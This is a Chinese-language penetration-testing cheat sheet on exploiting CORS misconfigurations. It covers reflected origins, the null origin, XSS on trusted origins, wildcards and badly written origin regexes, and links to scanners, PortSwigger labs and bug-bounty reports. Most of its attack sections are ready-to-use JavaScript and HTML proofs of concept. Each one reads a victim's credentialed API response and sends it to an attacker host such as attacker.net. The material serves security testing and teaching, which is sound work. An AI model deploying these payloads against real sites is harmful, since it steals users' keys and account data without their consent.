# 跨域资源共享（CORS）配置错误

> 对于一个API域名存在站点范围的CORS配置错误。这允许攻击者代表用户发起跨域请求，因为应用程序没有对Origin头进行白名单处理，并且设置了Access-Control-Allow-Credentials: true，这意味着我们可以使用受害者的凭据从攻击者的网站发起请求。

## 概述

* [工具](#工具)
* [需求](#需求)
* [方法论](#方法论)
    * [Origin反射](#origin反射)
    * [空Origin](#空origin)
    * [可信来源上的XSS](#可信来源上的xss)
    * [无凭证的通配符Origin](#无凭证的通配符origin)
    * [扩展的Origin](#扩展的origin)
* [实验室](#实验室)
* [参考](#参考)

## 工具

* [s0md3v/Corsy](https://github.com/s0md3v/Corsy/) - CORS配置错误扫描器
* [chenjj/CORScanner](https://github.com/chenjj/CORScanner) - 快速检测CORS配置错误漏洞的扫描器
* [@honoki/PostMessage](https://tools.honoki.net/postmessage.html) - POC构建工具
* [trufflesecurity/of-cors](https://github.com/trufflesecurity/of-cors) - 利用内部网络中的CORS配置错误
* [omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne) - 快速发现CORS配置错误的工具

## 需求

* BURP HEADER> `Origin: https://evil.com`
* 受害方 HEADER> `Access-Control-Allow-Credential: true`
* 受害方 HEADER> `Access-Control-Allow-Origin: https://evil.com` 或 `Access-Control-Allow-Origin: null`

## 方法论

通常你希望针对一个API端点。使用以下有效载荷来利用目标`https://victim.example.com/endpoint`的CORS配置错误。

### Origin反射

#### 易受攻击的实现

```powershell
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: https://evil.com
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true 

{"[私有API密钥]"}
```

#### 漏洞证明

此PoC需要相应的JS脚本托管在`evil.com`

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://victim.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

或者

```html
<html>
     <body>
         <h2>CORS PoC</h2>
         <div id="demo">
             <button type="button" onclick="cors()">Exploit</button>
         </div>
         <script>
             function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
              xhr.open("GET",
                       "https://victim.example.com/endpoint", true);
             xhr.withCredentials = true;
             xhr.send();
             }
         </script>
     </body>
 </html>
```

### 空Origin

#### 易受攻击的实现

服务器可能不会反射完整的`Origin`头，但允许`null` origin。这在服务器响应中看起来像这样：

```ps1
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: null
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true 

{"[私有API密钥]"}
```

#### 漏洞证明

可以通过使用数据URI方案将攻击代码放入iframe中来利用。如果使用数据URI方案，浏览器将在请求中使用`null` origin：

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://victim.example.com/endpoint',true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
    location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);
   };
</script>"></iframe> 
```

### 可信来源上的XSS

如果应用程序确实实施了严格的允许来源白名单，上述攻击代码将不起作用。但如果在可信来源上存在XSS，你可以注入上述攻击代码以再次利用CORS。

```ps1
https://trusted-origin.example.com/?xss=<script>CORS-ATTACK-PAYLOAD</script>
```

### 无凭证的通配符Origin

如果服务器响应为通配符origin `*`，**浏览器永远不会发送cookies**。然而，如果服务器不需要身份验证，仍然可以访问服务器上的数据。这种情况可能发生在不可从互联网访问的内部服务器上。攻击者的网站可以然后通过内部网络进行切换并无需身份验证即可访问服务器的数据。

```powershell
* 是唯一的通配符origin
https://*.example.com 不是有效的
```

#### 易受攻击的实现

```powershell
GET /endpoint HTTP/1.1
Host: api.internal.example.com
Origin: https://evil.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *

{"[私有API密钥]"}
```

#### 漏洞证明

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.internal.example.com/endpoint',true); 
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

### 扩展的Origin

偶尔，服务器端未过滤原始origin的某些扩展。这可能是由于使用了实现不良的正则表达式来验证origin头导致的。

#### 易受攻击的实现（示例1）

在这种情况下，任何插入到`example.com`前面的前缀都会被服务器接受。

```ps1
GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://evilexample.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evilexample.com
Access-Control-Allow-Credentials: true 

{"[私有API密钥]"}
```

#### 漏洞证明（示例1）

此PoC需要相应的JS脚本托管在`evilexample.com`

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

#### 易受攻击的实现（示例2）

在这种情况下，服务器使用了一个正则表达式，其中的句点未正确转义。例如，类似这样的内容：`^api.example.com$`而不是`^api\.example.com$`。因此，句点可以用任何字母替换，从而可以从第三方域获得访问权限。

```ps1
GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://apiiexample.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://apiiexample.com
Access-Control-Allow-Credentials: true 

{"[私有API密钥]"}
```

#### 漏洞概念证明（示例2）

此PoC需要相应的JS脚本托管在`apiiexample.com`

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

## 实验室

* [PortSwigger - 基础Origin反射攻击的CORS漏洞](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
* [PortSwigger - 允许空Origin的CORS漏洞](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)
* [PortSwigger - 允许可信不安全协议的CORS漏洞](https://portswigger.net/web-security/cors/lab-breaking-https-attack)
* [PortSwigger - 内部网络切换攻击的CORS漏洞](https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack)

## 参考

* [[██████] 跨源资源共享配置错误（CORS） - Vadim (jarvis7) - 2018年12月20日](https://hackerone.com/reports/470298)
* [高级CORS攻击技术 - Corben Leo - 2018年6月16日](https://web.archive.org/web/20190516052453/https://www.corben.io/advanced-cors-techniques/)
* [CORS配置错误导致账户接管 - Rohan (nahoragg) - 2018年10月20日](https://hackerone.com/reports/426147)
* [CORS配置错误导致私密信息泄露 - sandh0t (sandh0t) - 2018年10月29日](https://hackerone.com/reports/430249)
* [www.zomato.com上的CORS配置错误 - James Kettle (albinowax) - 2016年9月15日](https://hackerone.com/reports/168574)
* [CORS配置错误解释 - Detectify博客 - 2018年4月26日](https://blog.detectify.com/2018/04/26/cors-misconfigurations-explained/)
* [跨源资源共享（CORS） - PortSwigger网络安全学院 - 2019年12月30日](https://portswigger.net/web-security/cors)
* [CORS配置错误 | 盗取用户信息 - bughunterboy (bughunterboy) - 2017年6月1日](https://hackerone.com/reports/235200)
* [利用CORS配置错误获取比特币和奖励 - James Kettle - 2016年10月14日](https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
* [利用配置错误的CORS（跨源资源共享） - Geekboy - 2016年12月16日](https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/)
* [Think Outside the Scope: 高级CORS攻击技术 - Ayoub Safa (Sandh0t) - 2019年5月14日](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)